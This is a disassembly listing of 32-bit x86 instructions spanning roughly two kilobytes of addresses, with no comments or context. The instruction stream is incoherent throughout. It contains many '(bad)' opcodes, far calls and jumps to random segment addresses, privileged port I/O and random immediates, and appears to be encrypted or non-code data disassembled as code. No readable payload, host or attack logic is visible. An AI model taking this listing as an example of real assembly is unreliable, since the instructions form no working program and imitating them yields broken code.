  40c98b:	fnstenv [ebp+0x2d]
  40c98e:	xchg   edi,eax
  40c98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c990:	pop    ss
  40c991:	or     edi,DWORD PTR [esi]
  40c993:	xchg   ecx,eax
  40c994:	stos   DWORD PTR es:[edi],eax
  40c995:	mov    ch,0xb3
  40c997:	imul   edx,DWORD PTR [esi+0x1c],0xffffffef
  40c99b:	das    
  40c99c:	mov    cl,0xd7
  40c99e:	mov    esp,0xbeb22fe6
  40c9a3:	pop    ss
  40c9a4:	(bad)  
  40c9a6:	cwde   
  40c9a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9a8:	hlt    
  40c9a9:	outs   dx,DWORD PTR ds:[esi]
  40c9aa:	dec    esi
  40c9ab:	mov    esp,DWORD PTR [edx]
  40c9ad:	int3   
  40c9ae:	idiv   BYTE PTR [edx+esi*4-0x2e]
  40c9b2:	mov    ds:0x77718b7d,al
  40c9b7:	mov    al,ds:0x2b320272
  40c9bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9bd:	sbb    DWORD PTR ss:[esi-0x13],edi
  40c9c1:	jecxz  0x40ca25
  40c9c3:	mov    ecx,0x98823bbb
  40c9c8:	call   0x7747962d
  40c9cd:	or     edi,DWORD PTR [eax-0x5973e457]
  40c9d3:	repz mov al,0x86
  40c9d6:	call   0xd1df:0xeab738e0
  40c9dd:	mov    ebx,0xb6cd6c6
  40c9e2:	dec    esp
  40c9e3:	dec    edx
  40c9e4:	xchg   ebx,eax
  40c9e5:	sub    eax,0xb3492b36
  40c9ea:	cdq    
  40c9eb:	(bad)  
  40c9ed:	in     al,0x42
  40c9ef:	daa    
  40c9f0:	arpl   dx,cx
  40c9f2:	jmp    0x6fa4:0x79bac2be
  40c9f9:	cdq    
  40c9fa:	xor    eax,0x72381a47
  40c9ff:	mov    ebp,edx
  40ca01:	cmp    ecx,DWORD PTR [ebp-0x652ac40f]
  40ca07:	push   ebx
  40ca08:	fist   WORD PTR [esi]
  40ca0a:	mov    al,0x7a
  40ca0c:	loopne 0x40c9ef
  40ca0e:	test   eax,0x9b4d95ff
  40ca13:	mov    eax,ds:0x85d70c2b
  40ca18:	mov    al,0x8b
  40ca1a:	jmp    0x8a68:0xf3e164d3
  40ca21:	or     BYTE PTR [edi],ah
  40ca23:	xor    ecx,esi
  40ca25:	jne    0x40c9b3
  40ca27:	sub    bh,BYTE PTR [ebp+0x2a]
  40ca2a:	pop    edi
  40ca2b:	lea    eax,[ebx]
  40ca2d:	rcr    DWORD PTR [ebp+0x26],cl
  40ca30:	mov    bl,0x64
  40ca32:	push   esi
  40ca33:	jae    0x40ca8f
  40ca35:	clc    
  40ca36:	inc    esi
  40ca37:	ds dec edx
  40ca39:	cli    
  40ca3a:	(bad)  
  40ca3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca3c:	push   ebp
  40ca3d:	jmp    0x40ca6a
  40ca3f:	(bad)
  40ca43:	inc    esp
  40ca44:	inc    esp
  40ca45:	sbb    BYTE PTR [edx-0x667d018e],bl
  40ca4b:	int    0xb
  40ca4d:	jle    0x40ca71
  40ca4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca50:	out    dx,eax
  40ca51:	shl    BYTE PTR [esi-0x78a45c2],1
  40ca57:	inc    edx
  40ca58:	iret   
  40ca59:	cmp    ebx,DWORD PTR [edx+0x651cc9ea]
  40ca5f:	mov    edi,0xa70080f1
  40ca64:	mov    dh,0x6
  40ca66:	retf   
  40ca67:	push   ecx
  40ca68:	jmp    0x40c9f3
  40ca6a:	fdiv   DWORD PTR [esi-0x4e]
  40ca6d:	aam    0x9
  40ca6f:	cdq    
  40ca70:	loop   0x40ca13
  40ca72:	fwait
  40ca73:	mov    ebp,0x8210bb5
  40ca78:	sub    eax,0x50bf1018
  40ca7d:	arpl   WORD PTR [edx+0x4576b054],bx
  40ca83:	mov    al,0x5f
  40ca85:	cdq    
  40ca86:	push   ss
  40ca87:	call   0xf582:0xa91a0f9e
  40ca8e:	cli    
  40ca8f:	push   edx
  40ca90:	mov    es,WORD PTR [ebx]
  40ca92:	mov    al,ds:0x22b057bd
  40ca97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca99:	and    DWORD PTR ds:0x4ad989c9,ecx
  40ca9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caa0:	mov    ds:0x881a3af8,eax
  40caa5:	shl    BYTE PTR ds:0xc65f894d,cl
  40caab:	daa    
  40caac:	jp     0x40ca43
  40caae:	call   FWORD PTR [edi-0x60a3c769]
  40cab4:	in     eax,dx
  40cab5:	rcr    BYTE PTR [edx-0x3d77b190],0x3a
  40cabc:	sbb    ecx,DWORD PTR [edi-0x65]
  40cabf:	inc    ebx
  40cac0:	call   DWORD PTR [edi]
  40cac2:	mov    DWORD PTR [ecx-0x7d],0xe5d57e89
  40cac9:	or     ebp,DWORD PTR [eax+0x48c5249b]
  40cacf:	es push edx
  40cad1:	pop    es
  40cad2:	call   0xac5a:0x14bed655
  40cad9:	jp     0x40cab2
  40cadb:	cdq    
  40cadc:	sbb    al,0x2c
  40cade:	call   0x9646:0x739dcd84
  40cae5:	cmp    DWORD PTR [edx-0x6c9f223c],ebx
  40caeb:	mov    cl,0x15
  40caed:	sub    cl,BYTE PTR [edx+0x1927e599]
  40caf3:	(bad)  
  40caf4:	aam    0xba
  40caf6:	add    al,0x8e
  40caf8:	jnp    0x40cb76
  40cafa:	addr16 mov edx,0x2e77a479
  40cb01:	or     eax,DWORD PTR [eax+0x7f719265]
  40cb07:	ss int 0xb
  40cb0a:	lahf   
  40cb0b:	mov    cs,WORD PTR [ebp+0x5905871c]
  40cb11:	cmp    eax,0x4b416a9a
  40cb16:	and    bl,dl
  40cb18:	popf   
  40cb19:	sub    al,0xbc
  40cb1b:	mov    edx,0xa81e7ee1
  40cb20:	cld    
  40cb21:	outs   dx,BYTE PTR ds:[esi]
  40cb22:	cmp    eax,0x333b1cfd
  40cb27:	mov    dh,BYTE PTR [ebx-0x13b46ad2]
  40cb2d:	xchg   esp,eax
  40cb2e:	lahf   
  40cb2f:	pop    es
  40cb30:	jmp    0xaf76175f
  40cb35:	adc    al,0x75
  40cb37:	in     al,0xf9
  40cb39:	or     edi,DWORD PTR [ebp+0x1e7c8a04]
  40cb3f:	mov    esp,0xd56a57b2
  40cb44:	cwde   
  40cb45:	mov    bh,cl
  40cb47:	adc    eax,0xa6cdff52
  40cb4c:	pop    ebx
  40cb4d:	pop    eax
  40cb4e:	shr    ch,cl
  40cb50:	fidiv  WORD PTR [edi]
  40cb52:	pop    esi
  40cb53:	addr16 pop esp
  40cb55:	xor    eax,0x6a9dcf9a
  40cb5a:	mov    ebx,0x9c2de8e1
  40cb5f:	test   eax,0xd4e01eba
  40cb64:	rcr    BYTE PTR ds:0x62f81a26,cl
  40cb6a:	mov    ds:0x988c80c0,al
  40cb6f:	xchg   edx,eax
  40cb70:	leave  
  40cb71:	inc    esp
  40cb72:	jp     0x40caf6
  40cb74:	or     DWORD PTR [eax+0x3ad41fb3],0x42
  40cb7b:	lock adc al,0x8
  40cb7e:	out    dx,al
  40cb7f:	xchg   edi,eax
  40cb80:	or     BYTE PTR [esi-0x1524d266],ch
  40cb86:	test   DWORD PTR [ecx+0x7e],esi
  40cb89:	data16 (bad) 
  40cb8b:	pop    ebx
  40cb8c:	out    0xb,al
  40cb8e:	ins    BYTE PTR es:[edi],dx
  40cb8f:	mov    esp,es
  40cb91:	jp     0x40cb90
  40cb93:	jl     0x40cb78
  40cb95:	lea    ebx,[edx+0x4cc14d47]
  40cb9b:	mov    edx,0xa7dab425
  40cba0:	ret    0xac78
  40cba3:	push   esp
  40cba4:	inc    ebp
  40cba6:	mov    esi,0xdc92fe08
  40cbab:	test   eax,0x8cfacf0
  40cbb0:	(bad)  
  40cbb1:	gs xchg ebp,eax
  40cbb3:	inc    edi
  40cbb4:	mov    ds:0x7f7f77f7,al
  40cbb9:	or     ebp,DWORD PTR [eax]
  40cbbb:	push   eax
  40cbbc:	add    edx,esp
  40cbbe:	mov    ebp,0x9b1023e1
  40cbc3:	shl    dl,1
  40cbc5:	pop    edx
  40cbc6:	call   0xfaa11481
  40cbcb:	daa    
  40cbcc:	push   es
  40cbcd:	add    al,0x85
  40cbcf:	push   ds
  40cbd0:	inc    ebp
  40cbd1:	dec    esi
  40cbd2:	jge    0x40cbd5
  40cbd4:	cmc    
  40cbd5:	jnp    0x40cb82
  40cbd7:	adc    ah,BYTE PTR [ebx-0x4d38893a]
  40cbdd:	jp     0x40cb9e
  40cbdf:	jle    0x40cbe2
  40cbe1:	jmp    0x9f98:0x781583d5
  40cbe8:	repnz pop edi
  40cbea:	mov    esp,0x270bb993
  40cbef:	jg     0x40cbad
  40cbf1:	cmp    DWORD PTR [eax+eiz*4],eax
  40cbf4:	mov    dl,0xa0
  40cbf6:	mov    eax,DWORD PTR ds:0x25e003f0
  40cbfc:	rcl    BYTE PTR [ecx+eiz*8],0x71
  40cc00:	inc    esp
  40cc01:	or     edx,ebx
  40cc03:	(bad)
  40cc07:	into   
  40cc08:	mov    dl,0x34
  40cc0a:	hlt    
  40cc0b:	stos   BYTE PTR es:[edi],al
  40cc0c:	lods   al,BYTE PTR ds:[esi]
  40cc0d:	jl     0x40cbec
  40cc0f:	call   FWORD PTR [esi-0x3d241f5]
  40cc15:	pop    esi
  40cc16:	xor    al,0xfe
  40cc18:	out    dx,al
  40cc19:	rol    BYTE PTR [ebp+0x1ab04941],1
  40cc1f:	ret    
  40cc20:	lods   al,BYTE PTR ds:[esi]
  40cc21:	pop    ebx
  40cc22:	push   es
  40cc23:	mov    ds:0xa2f0bcb,eax
  40cc28:	(bad)  [edi]
  40cc2a:	outs   dx,BYTE PTR ds:[esi]
  40cc2b:	xchg   edi,eax
  40cc2c:	xor    BYTE PTR [esi],ch
  40cc2e:	call   0x9cff:0xcbe68d7d
  40cc35:	ret    
  40cc36:	jl     0x40cbdc
  40cc38:	jne    0x40cbfa
  40cc3a:	call   DWORD PTR [esi+0x57252866]
  40cc40:	dec    ebx
  40cc41:	ins    BYTE PTR es:[edi],dx
  40cc42:	idiv   DWORD PTR [ecx-0x4e]
  40cc45:	sub    DWORD PTR [edx+edx*8+0x6b],0xfffffff8
  40cc4a:	cmp    DWORD PTR [ebx+0xa],ebp
  40cc4d:	jns    0x40cc10
  40cc4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc50:	or     DWORD PTR [ebx+0x24],ebx
  40cc53:	push   0xe50829
  40cc58:	mov    dl,0x16
  40cc5a:	loop   0x40cc70
  40cc5c:	test   BYTE PTR [ecx],ah
  40cc5e:	(bad)  
  40cc5f:	ds dec eax
  40cc61:	or     esp,DWORD PTR [ebx+0x23]
  40cc64:	and    BYTE PTR [esp+ebx*8],0x24
  40cc68:	jne    0x40cc9c
  40cc6a:	call   0x4714:0xa7fba2fb
  40cc71:	mov    dl,0x9c
  40cc73:	mov    al,ds:0x87ccbf58
  40cc78:	shr    DWORD PTR [ebx-0x2ba4abbc],1
  40cc7e:	call   0xc96b:0x87248d24
  40cc85:	sub    eax,0x9343a749
  40cc8a:	shl    BYTE PTR [edx+0x76a70cf8],cl
  40cc90:	mov    dl,0xad
  40cc92:	sbb    eax,0xae09fc52
  40cc97:	dec    ecx
  40cc98:	test   DWORD PTR [ebx],ecx
  40cc9a:	mov    cl,0x3c
  40cc9c:	xchg   edi,eax
  40cc9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9e:	jb     0x40ccf1
  40cca0:	adc    eax,DWORD PTR [esi-0x470df863]
  40cca6:	mov    ebx,0x36cbe2d8
  40ccab:	sub    al,0x51
  40ccad:	or     dl,bh
  40ccaf:	int    0xc0
  40ccb1:	and    BYTE PTR [edi],dh
  40ccb3:	in     al,0x2b
  40ccb5:	and    DWORD PTR [edi-0x65227289],esi
  40ccbb:	retf   0x891c
  40ccbe:	jmp    0x652b9167
  40ccc3:	dec    ebp
  40ccc4:	sub    BYTE PTR [edi],dh
  40ccc6:	fstp   st(7)
  40ccc8:	xor    ch,BYTE PTR [edi+0x1cb8f66e]
  40ccce:	mov    DWORD PTR [ebp-0x4a],edx
  40ccd1:	xor    ah,BYTE PTR [edx+0x5b1df2c5]
  40ccd7:	add    BYTE PTR [edi+0x1b825238],cl
  40ccdd:	jge    0x40ccdb
  40ccdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cce0:	mov    ds:0x5bb2b4fe,al
  40cce5:	les    edi,FWORD PTR [ebp+0x5ef17c2e]
  40cceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccec:	dec    ebp
  40cced:	mov    dh,0xf2
  40ccef:	rcr    BYTE PTR [eax+0x33d8560b],cl
  40ccf5:	push   cs
  40ccf6:	jno    0x40cd50
  40ccf8:	fs mov cl,0x9a
  40ccfb:	and    DWORD PTR [eax+edi*4+0x28],ecx
  40ccff:	adc    bl,BYTE PTR [ebx-0x61]
  40cd02:	and    DWORD PTR [edi-0x38b2680f],0xdf88fe32
  40cd0c:	mov    DWORD PTR [ebx+eiz*1],ecx
  40cd0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd10:	add    BYTE PTR [edx-0x443c7b6a],al
  40cd16:	dec    edx
  40cd17:	fistp  QWORD PTR [ebx+ecx*1]
  40cd1a:	sbb    esi,DWORD PTR [edx]
  40cd1c:	aas    
  40cd1d:	mov    WORD PTR [ebp-0x12],?
  40cd20:	sbb    BYTE PTR [esp+eiz*4],dh
  40cd23:	(bad)  
  40cd24:	in     al,dx
  40cd25:	mov    esp,eax
  40cd27:	fdivr  QWORD PTR [ebx]
  40cd29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd2a:	test   BYTE PTR [ebx+0xf],bh
  40cd2d:	add    al,0x56
  40cd2f:	ins    BYTE PTR es:[edi],dx
  40cd30:	inc    edi
  40cd31:	lods   al,BYTE PTR ds:[esi]
  40cd32:	mov    ebp,0x1ad08673
  40cd37:	add    eax,0x659f2ff7
  40cd3c:	mov    dl,0xff
  40cd3e:	mov    BYTE PTR [ebx-0x185deb08],bh
  40cd44:	mov    dh,0xb
  40cd46:	jl     0x40cd53
  40cd48:	loopne 0x40cce4
  40cd4a:	xor    BYTE PTR [edx],bl
  40cd4c:	or     al,0x95
  40cd4e:	call   0xb6:0x68d7fdb0
  40cd55:	sub    cl,cl
  40cd57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd59:	test   BYTE PTR ds:0xeb1ed163,ah
  40cd5f:	clc    
  40cd60:	mov    dl,0x55
  40cd62:	fwait
  40cd63:	pop    edi
  40cd64:	mov    edx,0xb5dde391
  40cd69:	adc    eax,0xcb840d4d
  40cd6e:	outs   dx,DWORD PTR ds:[esi]
  40cd6f:	popf   
  40cd70:	outs   dx,BYTE PTR ds:[esi]
  40cd71:	push   ecx
  40cd72:	mov    WORD PTR [edx],cs
  40cd74:	lods   al,BYTE PTR ds:[esi]
  40cd75:	pop    edx
  40cd76:	fs push es
  40cd78:	xor    al,BYTE PTR [ecx+0x56]
  40cd7b:	stos   DWORD PTR es:[edi],eax
  40cd7c:	add    dl,BYTE PTR [ebx+eax*4]
  40cd7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd80:	sbb    esp,DWORD PTR [ebx+0x79]
  40cd83:	js     0x40cd0b
  40cd85:	test   al,0xf0
  40cd87:	inc    esi
  40cd88:	test   al,0xfb
  40cd8a:	iret   
  40cd8b:	ins    BYTE PTR es:[edi],dx
  40cd8c:	mov    dl,0xf7
  40cd8e:	mov    edx,0xeaf3ed1a
  40cd93:	and    al,0x98
  40cd95:	or     esp,edi
  40cd97:	add    eax,0xcdd156e9
  40cd9c:	jg     0x40cdd8
  40cd9e:	jb     0x40cd92
  40cda0:	mov    dl,0xd5
  40cda2:	call   0x6f341db8
  40cda7:	(bad)  
  40cda8:	cmc    
  40cda9:	pop    ss
  40cdaa:	xchg   esp,eax
  40cdab:	push   ebp
  40cdac:	scas   eax,DWORD PTR es:[edi]
  40cdad:	or     eax,DWORD PTR ds:0x89466b6b
  40cdb3:	jno    0x40cd98
  40cdb5:	xor    al,BYTE PTR ss:[edi+0x60]
  40cdb9:	enter  0x1198,0xf4
  40cdbd:	sbb    BYTE PTR [ebp-0xd],0xf9
  40cdc1:	mov    esp,DWORD PTR [esi]
  40cdc3:	push   ebx
  40cdc4:	adc    DWORD PTR [ebp-0x57],eax
  40cdc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdc8:	inc    esp
  40cdc9:	pop    ds
  40cdca:	mov    esi,0x9fa20432
  40cdcf:	sub    eax,0xde8a09b2
  40cdd4:	rcr    BYTE PTR [esi-0x65],cl
  40cdd7:	nop
  40cdd8:	dec    ebx
  40cdd9:	or     ebx,DWORD PTR [edi+0x52]
  40cddc:	inc    eax
  40cddd:	clc    
  40cdde:	repnz cli 
  40cde0:	out    dx,al
  40cde1:	mov    ch,0x93
  40cde3:	xor    BYTE PTR [edx],bh
  40cde5:	aas    
  40cde6:	jb     0x40cd8a
  40cde8:	adc    al,BYTE PTR [edi]
  40cdea:	xchg   ebp,eax
  40cdeb:	inc    edx
  40cdec:	or     eax,0xb2bb86d9
  40cdf1:	mov    ds:0x608c0d85,al
  40cdf6:	mov    WORD PTR [esi+0x666fd248],fs
  40cdfc:	mov    ah,0x2a
  40cdfe:	arpl   WORD PTR ss:[eax],di
  40ce01:	out    0x9a,eax
  40ce03:	sbb    DWORD PTR [ebp-0x5e],0x47
  40ce07:	and    eax,0xa7621d88
  40ce0c:	cmp    cl,BYTE PTR [edi]
  40ce0e:	jo     0x40ce10
  40ce10:	jae    0x40ce3e
  40ce12:	mov    edx,0x68fab2d9
  40ce17:	ret    0x88c6
  40ce1a:	ds ja  0x40ce16
  40ce1d:	jg     0x40cda2
  40ce1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce20:	push   es
  40ce21:	push   ss
  40ce22:	xchg   edi,eax
  40ce23:	test   al,0x74
  40ce25:	sub    eax,0xaab2315f
  40ce2a:	int3   
  40ce2b:	outs   dx,BYTE PTR ds:[esi]
  40ce2c:	add    eax,0x792eb486
  40ce31:	or     edx,DWORD PTR [eax-0x79480d8b]
  40ce37:	cmp    dh,cl
  40ce39:	fcomp  DWORD PTR [edx-0x44cf967d]
  40ce3f:	sbb    cl,BYTE PTR [edi+0x1fa75cb9]
  40ce45:	xchg   ebx,eax
  40ce46:	inc    edx
  40ce47:	aad    0x7b
  40ce49:	mov    esi,0xb3b2da65
  40ce4e:	mov    ds:0x50ef41c8,al
  40ce53:	or     ebx,DWORD PTR [eax+ecx*1-0x80]
  40ce57:	iret   
  40ce58:	xlat   BYTE PTR ds:[ebx]
  40ce59:	popf   
  40ce5a:	aaa    
  40ce5b:	aam    0x3
  40ce5d:	inc    eax
  40ce5e:	das    
  40ce5f:	arpl   WORD PTR [edx],di
  40ce61:	and    BYTE PTR [edx-0x42fd79e5],bl
  40ce67:	es aad 0xea
  40ce6a:	int3   
  40ce6b:	mov    al,ds:0xbbfa3dad
  40ce70:	daa    
  40ce71:	test   BYTE PTR gs:[edi-0x53d92b5f],ah
  40ce78:	call   0xaf1:0xb2aee0d3
  40ce7f:	jmp    0xc7662203
  40ce84:	mov    dl,BYTE PTR [edi]
  40ce86:	ins    DWORD PTR es:[edi],dx
  40ce87:	add    esp,DWORD PTR [ebx+0x61a745e5]
  40ce8d:	push   0xffffffd8
  40ce8f:	mov    WORD PTR [edi],ss
  40ce91:	in     eax,0x84
  40ce93:	sub    BYTE PTR [eax+0xd],ch
  40ce96:	cdq    
  40ce97:	xor    al,0x53
  40ce99:	data16 fldcw WORD PTR [ecx]
  40ce9c:	hlt    
  40ce9d:	or     al,0x9b
  40ce9f:	pop    es
  40cea0:	push   ecx
  40cea1:	dec    ebp
  40cea2:	xor    DWORD PTR [edi+0x4776dd07],edx
  40cea8:	mov    dl,0x88
  40ceaa:	jb     0x40cf2a
  40ceac:	jge    0x40cef2
  40ceae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceaf:	and    cl,bl
  40ceb1:	or     eax,eax
  40ceb3:	das    
  40ceb4:	sbb    eax,0x9e13ce0f
  40ceb9:	sbb    BYTE PTR [ebp-0x259fef7d],0x8f
  40cec0:	dec    ebx
  40cec1:	add    BYTE PTR [ecx],0xa7
  40cec4:	inc    ebp
  40cec5:	dec    ebp
  40cec6:	lds    esi,FWORD PTR ds:0xd3e41735
  40cecc:	xchg   ecx,eax
  40cecd:	dec    ebx
  40cece:	mov    eax,0xb2fae0e7
  40ced3:	ja     0x40ce87
  40ced5:	adc    eax,0xba0b2307
  40ceda:	or     eax,0x100a2842
  40cedf:	cwde   
  40cee0:	add    DWORD PTR [ebp-0x5a5ba2],esp
  40cee6:	push   0x6c66bd9b
  40ceeb:	inc    ebp
  40ceec:	ja     0x40ce79
  40ceee:	mov    dl,0xb5
  40cef0:	jo     0x40ced9
  40cef2:	jae    0x40ce92
  40cef4:	sahf   
  40cef5:	jge    0x40ce9d
  40cef7:	(bad)  
  40cef8:	cmp    eax,0x9285ea0a
  40cefd:	xor    dh,dh
  40ceff:	idiv   ebx
  40cf01:	aam    0x86
  40cf03:	cli    
  40cf04:	dec    ebp
  40cf05:	dec    ecx
  40cf06:	sbb    al,bl
  40cf08:	stos   DWORD PTR es:[edi],eax
  40cf09:	xchg   esi,eax
  40cf0a:	pushf  
  40cf0b:	enter  0x2ffa,0x34
  40cf0f:	dec    esp
  40cf10:	ja     0x40cf27
  40cf12:	(bad)  
  40cf13:	out    0x97,eax
  40cf15:	push   cs
  40cf16:	inc    ecx
  40cf17:	mov    ds:0x609dd61a,eax
  40cf1c:	mov    BYTE PTR [ecx-0x455dd1d7],bh
  40cf22:	nop
  40cf23:	xlat   BYTE PTR ds:[ebx]
  40cf24:	dec    edi
  40cf25:	or     dl,BYTE PTR [esi-0x2c]
  40cf28:	fwait
  40cf29:	aas    
  40cf2a:	(bad)  
  40cf2b:	out    dx,al
  40cf2c:	loopne 0x40cefd
  40cf2e:	sbb    DWORD PTR [esi-0x4e],ecx
  40cf31:	pop    ds
  40cf32:	(bad)  
  40cf33:	rol    DWORD PTR [ecx-0x6fefcd86],1
  40cf39:	or     ebp,DWORD PTR [edi]
  40cf3b:	pop    edx
  40cf3c:	aaa    
  40cf3d:	xchg   ebx,eax
  40cf3e:	mov    ch,0x9f
  40cf40:	test   ch,0x9a
  40cf43:	enter  0x6a88,0x1
  40cf47:	sub    esi,DWORD PTR [eax-0x7d580d48]
  40cf4d:	int    0x7a
  40cf4f:	dec    eax
  40cf50:	pop    esi
  40cf51:	js     0x40cf1c
  40cf53:	into   
  40cf54:	mov    ch,0xab
  40cf56:	xor    DWORD PTR [eax+ebx*2-0x7f7146d6],0xb06edc8b
  40cf61:	pop    ss
  40cf62:	ss scas eax,DWORD PTR es:[edi]
  40cf64:	sbb    BYTE PTR [ebx],cl
  40cf66:	in     al,dx
  40cf67:	sbb    cl,ch
  40cf69:	js     0x40cf0c
  40cf6b:	dec    ebx
  40cf6c:	mov    ch,0x5e
  40cf6e:	mov    WORD PTR [esi],es
  40cf70:	mov    edi,0xf82e7aef
  40cf75:	cli    
  40cf76:	lods   al,BYTE PTR gs:[esi]
  40cf78:	test   DWORD PTR [edi-0x52c5e5c9],esp
  40cf7e:	outs   dx,DWORD PTR ds:[esi]
  40cf7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf80:	jne    0x40cf98
  40cf82:	in     al,0x48
  40cf84:	les    esi,FWORD PTR [esi-0x63]
  40cf87:	sub    ch,dl
  40cf89:	pusha  
  40cf8a:	adc    eax,0x36bd12c4
  40cf8f:	jo     0x40cf1b
  40cf91:	xor    BYTE PTR [edi-0x2a],al
  40cf94:	xor    cl,dl
  40cf96:	out    dx,eax
  40cf97:	cmp    BYTE PTR ds:0xb22f41f5,dh
  40cf9d:	mov    cl,0x59
  40cf9f:	arpl   WORD PTR [esi+0x202ec009],ax
  40cfa5:	xor    BYTE PTR [eax],ch
  40cfa7:	scas   eax,DWORD PTR es:[edi]
  40cfa8:	mov    dl,0x2d
  40cfaa:	jl     0x40cf94
  40cfac:	inc    DWORD PTR [edi-0x13fdeb98]
  40cfb2:	call   0x5e68:0xbbeae13e
  40cfb9:	sub    al,0x37
  40cfbb:	test   eax,0xe22efe43
  40cfc0:	cmc    
  40cfc1:	aam    0xc1
  40cfc3:	mov    bh,0x9b
  40cfc5:	adc    dl,BYTE PTR [ecx-0x150f4d17]
  40cfcb:	test   al,0x8e
  40cfcd:	popa   
  40cfce:	int    0xf1
  40cfd0:	sahf   
  40cfd1:	adc    eax,0xb4b22da
  40cfd6:	push   cs
  40cfd7:	mov    al,0x6b
  40cfd9:	stos   DWORD PTR es:[edi],eax
  40cfda:	pop    ss
  40cfdb:	mov    bh,0xb2
  40cfdd:	ret    0xd552
  40cfe0:	stc    
  40cfe1:	sub    dl,bh
  40cfe3:	sbb    ch,0xb
  40cfe6:	inc    esp
  40cfe7:	sub    DWORD PTR [eax+0x20],0xdb815ee6
  40cfee:	(bad)  
  40cfef:	or     esp,ecx
  40cff1:	or     esi,ecx
  40cff3:	mov    edi,0xe7a1dd91
  40cff8:	xor    eax,0x90e5930b
  40cffd:	mov    al,0xbf
  40cfff:	fistp  DWORD PTR [edi+eax*1-0x66]
  40d003:	mov    ds:0x442ff821,eax
  40d008:	add    BYTE PTR [ecx-0x29],dh
  40d00b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d00c:	pusha  
  40d00d:	xchg   esp,eax
  40d00e:	cmp    ebp,DWORD PTR [ecx+0x29b9626]
  40d014:	push   eax
  40d015:	fs cwde 
  40d017:	pop    ecx
  40d018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d019:	ret    
  40d01a:	stc    
  40d01b:	xchg   ebx,eax
  40d01c:	or     cl,BYTE PTR [edx-0x710b36b5]
  40d022:	imul   ebx,DWORD PTR [edi],0xa7993646
  40d028:	test   BYTE PTR ds:0xad5228de,cl
  40d02e:	aad    0xd2
  40d030:	mov    dl,0xe7
  40d032:	mov    al,0x2f
  40d034:	pushf  
  40d035:	(bad)  
  40d036:	in     eax,dx
  40d037:	sub    edx,DWORD PTR [edx]
  40d039:	or     ecx,DWORD PTR [eax]
  40d03b:	or     DWORD PTR [edi],esi
  40d03d:	mov    ecx,0xaf13bc71
  40d042:	retf   
  40d043:	retf   
  40d044:	xor    ecx,ebx
  40d046:	mov    dl,0xcc
  40d048:	mov    dl,0xc5
  40d04a:	push   esi
  40d04b:	pop    esp
  40d04c:	fcmovnb st,st(0)
  40d04e:	dec    esi
  40d04f:	popa   
  40d050:	das    
  40d051:	aaa    
  40d052:	and    DWORD PTR [edx+esi*1-0x61f7b3dc],ebx
  40d059:	jae    0x40cff7
  40d05b:	sub    dh,BYTE PTR [eax-0x28bd466e]
  40d061:	idiv   DWORD PTR [eax+0x65]
  40d064:	in     eax,dx
  40d065:	dec    ebx
  40d066:	stc    
  40d067:	addr16 test al,0xff
  40d06a:	xor    ah,BYTE PTR [edi-0x5298c9c9]
  40d070:	out    dx,al
  40d071:	pop    ebp
  40d072:	icebp  
  40d073:	or     eax,0xf2bc00b7
  40d078:	int    0x2e
  40d07a:	sbb    bl,bl
  40d07c:	xor    dh,BYTE PTR [ebx]
  40d07e:	pusha  
  40d07f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d080:	add    ebx,esp
  40d082:	das    
  40d083:	retf   0xfc9c
  40d086:	leave  
  40d087:	outs   dx,BYTE PTR ds:[esi]
  40d088:	inc    edi
  40d089:	jnp    0x40d0f4
  40d08b:	push   es
  40d08c:	mov    esi,0xa50ae86e
  40d091:	jae    0x40d082
  40d093:	test   al,0x8
  40d095:	inc    eax
  40d096:	mov    WORD PTR [edx+esi*1+0x76ddf28d],ss
  40d09d:	adc    bl,BYTE PTR [ebp+0x14eb6912]
  40d0a3:	cdq    
  40d0a4:	bound  ebp,QWORD PTR [ebx-0x21]
  40d0a7:	sbb    al,0xf4
  40d0a9:	or     ecx,DWORD PTR [ebx-0x68c4673]
  40d0af:	addr16 inc ecx
  40d0b1:	out    0x9a,al
  40d0b3:	adc    BYTE PTR [eax],dl
  40d0b5:	inc    esi
  40d0b6:	rol    DWORD PTR [ecx+0x1d],1
  40d0b9:	pop    esp
  40d0ba:	lea    ebp,[eax-0x2aeb88a6]
  40d0c0:	xor    ch,BYTE PTR [edi]
  40d0c2:	inc    esp
  40d0c3:	outs   dx,DWORD PTR ds:[esi]
  40d0c4:	cld    
  40d0c5:	gs call 0x3862:0x4322e2a4
  40d0cd:	or     eax,0x644ea797
  40d0d2:	ja     0x40d089
  40d0d4:	mov    esp,0xb2f13268
  40d0d9:	arpl   WORD PTR [eax],di
  40d0db:	gs mov es,ebx
  40d0de:	push   ebp
  40d0df:	adc    BYTE PTR [ebx+ecx*1],dl
  40d0e2:	or     ax,0x40f3
  40d0e6:	shr    BYTE PTR [di+0x27],1
  40d0ea:	call   0x529b:0x607dd11c
  40d0f1:	xor    edx,DWORD PTR [edi-0x59]
  40d0f4:	jl     0x40d07e
  40d0f6:	or     BYTE PTR [esi],dl
  40d0f8:	adc    eax,0xbd7cab39
  40d0fd:	adc    BYTE PTR [esi],cl
